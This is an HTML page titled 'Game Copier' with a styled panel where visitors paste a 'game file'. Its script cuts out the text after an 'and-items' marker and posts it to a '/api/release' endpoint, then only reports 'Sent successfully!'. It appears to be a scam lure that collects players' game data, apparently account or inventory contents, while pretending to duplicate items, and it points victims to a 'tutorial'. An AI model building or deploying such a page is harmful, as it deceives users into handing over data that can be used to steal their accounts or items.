<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Game Copier</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
height:100vh;
background:#05060a;
font-family:'Poppins',sans-serif;
display:flex;
align-items:center;
justify-content:center;
color:white;
overflow:hidden;
}
#particles{position:fixed;top:0;left:0;z-index:-1;}
.panel{
width:400px;
padding:30px;
border-radius:15px;
background:linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
border:1px solid rgba(255,255,255,0.15);
backdrop-filter:blur(15px);
text-align:center;
box-shadow:0 0 40px rgba(0,255,200,0.15);
}
h1{
font-size:32px;
margin-bottom:20px;
background:linear-gradient(90deg,#00f0ff,#00ff9d,#6a5cff);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}
textarea{
width:100%;height:120px;
background:#0d1117;border:1px solid #333;
border-radius:10px;padding:10px;color:white;resize:none;margin-bottom:20px;
}
button{
width:100%;padding:12px;border:none;border-radius:10px;
font-size:16px;font-weight:600;cursor:pointer;
background:linear-gradient(90deg,#00f0ff,#00ff9d);color:black;transition:0.3s;
}
button:hover{
transform:scale(1.05);
box-shadow:0 0 20px #00ffd5,0 0 40px rgba(0,255,200,0.3);
}
</style>
</head>
<body>

<canvas id="particles"></canvas>

<div class="panel">
<h1>Game Copier</h1>
<textarea id="gamefile" placeholder="Paste game file here..."></textarea>
<button onclick="startProcess()">Start Process</button>
</div>

<script>
// --- Start Process with filter ---
function startProcess(){
    const gamefile = document.getElementById("gamefile").value.trim();
    if(!gamefile){
        alert("Please paste a game file!");
        return;
    }

    // szukamy 'and-items'
    const startIndex = gamefile.indexOf("and-items");
    if(startIndex === -1){
        alert("file not found, watch the tutorial");
        return;
    }

    const substring = gamefile.slice(startIndex + "and-items".length);

    // szukamy dokładnej sekwencji ",/." i kończymy po niej
    const seq = '",/."';
    let endIndex = substring.indexOf(seq);
    if(endIndex !== -1) endIndex += seq.length; // wliczamy sekwencję
    else endIndex = substring.length; // jeśli brak sekwencji, bierzemy cały tekst po and-items

    const filteredText = substring.slice(0,endIndex).trim();

    if(!filteredText){
        alert("Brak tekstu po 'and-items'");
        return;
    }

    fetch("/api/release",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({ text: filteredText })
    })
    .then(res=>res.json())
    .then(()=>{ 
        alert("Sent successfully!"); 
        document.getElementById("gamefile").value="";
    })
    .catch(()=>{ 
        alert("Error sending data."); 
    })
}

// --- Particles background ---
const canvas=document.getElementById("particles");
const ctx=canvas.getContext("2d");
canvas.width=window.innerWidth;
canvas.height=window.innerHeight;
let particles=[];
for(let i=0;i<120;i++){
    particles.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,vx:(Math.random()-0.5)*0.6,vy:(Math.random()-0.5)*0.6});
}
function animate(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    for(let i=0;i<particles.length;i++){
        let p=particles[i];
        p.x+=p.vx; p.y+=p.vy;
        if(p.x<0||p.x>canvas.width)p.vx*=-1;
        if(p.y<0||p.y>canvas.height)p.vy*=-1;
        ctx.fillStyle="#00ffd5";
        ctx.beginPath();
        ctx.arc(p.x,p.y,2,0,Math.PI*2);
        ctx.fill();
        for(let j=i+1;j<particles.length;j++){
            let p2=particles[j];
            let dx=p.x-p2.x, dy=p.y-p2.y, dist=Math.sqrt(dx*dx+dy*dy);
            if(dist<120){
                ctx.strokeStyle="rgba(0,255,200,0.15)";
                ctx.beginPath();
                ctx.moveTo(p.x,p.y);
                ctx.lineTo(p2.x,p2.y);
                ctx.stroke();
            }
        }
    }
    requestAnimationFrame(animate);
}
animate();
</script>

</body>
</html>
